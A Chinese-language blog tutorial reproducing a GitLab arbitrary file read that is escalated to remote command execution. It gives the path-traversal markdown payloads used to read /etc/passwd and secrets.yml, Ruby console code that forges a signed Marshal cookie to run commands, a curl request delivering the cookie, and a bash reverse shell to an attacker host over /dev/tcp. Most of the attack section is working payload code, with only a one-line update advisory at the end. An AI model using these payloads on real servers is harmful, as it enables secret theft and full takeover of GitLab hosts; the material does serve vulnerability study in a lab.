## Gitlab任意文件读取导致远程命令执行

由于漏洞较新，复现不易，如果觉得对你帮助麻烦点个赞，未经允许不得转载，转载请标明出处，谢谢！！

漏洞环境搭建-Centos7

 **1.安装依赖软件**

    
    
    yum -y install policycoreutils openssh-server openssh-clients postfix

 **2.设置postfix开机自启，并启动，postfix支持gitlab发信功能（对漏洞环境应该不重要）**

    
    
    systemctl enable postfix && systemctl start postfix

> 3.下载gitlab安装包，然后安装  
> 官方下载：  
> CE下载地址：https://packages.gitlab.com/gitlab/gitlab-ce  
> EE下载地址：https://packages.gitlab.com/gitlab/gitlab-ee
>
> 清华开源镜像站下载：  
> centos 6系统的下载地址:https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6  
> centos 7系统的下载地址:https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7

(ps：测试9.5.0的版本时没有找到move issue功能。查看当前gitlab版本命令：

> cat/opt/gitlab/embedded/service/gitlab-rails/VERSION)

 **下载rpm包并安装:**

    
    
    wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-9.5.0-ce.0.el7.x86_64.rpm
    
    rpm -i gitlab-ce-9.5.0-ce.0.el7.x86_64.rpm

 **4.修改gitlab配置文件指定服务器ip和自定义端口**

 **vim /etc/gitlab/gitlab.rb**

![](https://image.3001.net/images/20210521/1621569191_60a72ea7320a4d4dd8464.png!small)
这里我设置了8888端口

 **5.重置并启动Gitlab**  
执行以下命令

    
    
    gitlab-ctl reconfigure
    
    gitlab-ctl restart

显示成功启动之后，访问端口进入Gitlab页面，提示修改root密码

(PS:若出现502页面，多次刷新页面即可，这是由于Gitlab性能要求比较高，服务器响应慢导致的，推荐虚拟机内存至少分配4G。)

# 漏洞复现

测试版本为gitlab-12.8.7-ce

### 任意文件读取

 **0x001 新建两个测试项目**

![](https://image.3001.net/images/20210521/1621569325_60a72f2db69360f1e3d39.png!small)
**0x002 在其中一个project中创建新的issue，在其问题描述中输入下方代码，然后提交**

    
    
    ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)

![](https://image.3001.net/images/20210521/1621569374_60a72f5edd32e1cf46315.png!small)
**0x003 创建issue成功后点击move issue，将它移动到test2中**

![](https://image.3001.net/images/20210521/1621569444_60a72fa49030e159eaa4d.png!small)

![](https://image.3001.net/images/20210602/1622597601_60b6dfe124b169651ac07.png!small)

 **0x004 test2中的issue中带了一个password附件**

![](https://image.3001.net/images/20210602/1622597649_60b6e0115f5307fc539e2.png!small)

 **0x005 点击下载password附件，用记事本方式打开，发现其内容就是/etc/password的内容**

![](https://image.3001.net/images/20210602/1622597687_60b6e037330c24ea5a214.png!small)

### RCE（remote command/code execute）

 **0x001 利用任意文件读取漏洞，下载/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml文件，获取secret_key_base**

![](https://image.3001.net/images/20210602/1622597744_60b6e070e39edc805d788.png!small)
**0x002 问题描述中输入：**

    
    
    ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)

 **0x003 下载secrets.yml，获取secret_key_base**

![](https://image.3001.net/images/20210602/1622597810_60b6e0b235c3673315d4e.png!small)![](https://image.3001.net/images/20210602/1622597832_60b6e0c81d07566b9aaa5.png!small)
**0x004
在自己的攻击机上搭建一个gitlab环境（详见环境搭建笔记），将目标机下载下来的secerts.yml覆盖在自己攻击机上/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml（也可以只替换secret_key_base）**

 **0x005 使用gitlab-rails console执行以下命令**

    
    
    gitlab-rails console #进入rails console

依次输入：

    
    
    request = ActionDispatch::Request.new(Rails.application.env_config)
    request.env["action_dispatch.cookies_serializer"] = :marshal
    cookies = request.cookie_jar
    erb = ERB.new("<%= `echo flag was here > /tmp/flag` %>")
    depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
    cookies.signed[:cookie] = depr
    puts cookies[:cookie]

![](https://image.3001.net/images/20210602/1622597927_60b6e1275a2e337fe872b.png!small)

 **0x006 获取cookie，构造语句：**

    
    
    curl -vvv 'http://192.168.1.86:8888/users/sign_in' -b "experimentation_subject_id=cookie"

（ps：experimentation_subject_id参数输入rail console获取的cookie值）

![](https://image.3001.net/images/20210602/1622597992_60b6e16879e122bd25855.png!small)通过任意文件读取下载/tmp/flag文件，内容：“flag
was here”，说明命令执行成功！

 **0x007 利用命令执行反弹shell**

生成cookie代码

    
    
    request = ActionDispatch::Request.new(Rails.application.env_config)
    request.env["action_dispatch.cookies_serializer"] = :marshal
    cookies = request.cookie_jar
    erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/192.168.1.120/7777 0>&1'` %>")
    depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
    cookies.signed[:cookie] = depr
    puts cookies[:cookie]

（ps：反弹shell的命令必须使用bash -c
包裹，否则反弹不了shell；使用控制台执行这些语句时，系统命令会在本机会执行一遍，所以在以上语句执行完成获取cookie值之前，不要在攻击机上执行监听端口命令）

 **获取cookie：**

![](https://image.3001.net/images/20210602/1622598080_60b6e1c08d9da31a9bece.png!small)
**在攻击机上监听端口：**

![](https://image.3001.net/images/20210602/1622598109_60b6e1dd01b8e3df9c83c.png!small)
**构造语句执行命令，连上shell：**

![](https://image.3001.net/images/20210602/1622598136_60b6e1f8bbe75a3b41715.png!small)

### EXP：<https://www.exploit-db.com/exploits/48431>

经验分享：附上任意文件读取漏洞利用exploit-db的python脚本，不过拿到这个脚本的时候发现不能直接利用，下载了对应的gitlab-12.9.0
ce版本进行测试还是不行（博主没有对ee版进行测试），可能是因为博主是python小白花费了不少时间纠错，挂着burpsuite的代理一个包一个包的查错，对脚本进行了修改，最终还是成功执行了。

![](https://image.3001.net/images/20210602/1622598174_60b6e21ec9bb3c5563ed4.png!small)想了解更多可以查看漏洞博客  
参考：<https://hackerone.com/reports/827052>

# 安全建议

更新至最新版GitLab，禁止注册功能模块。

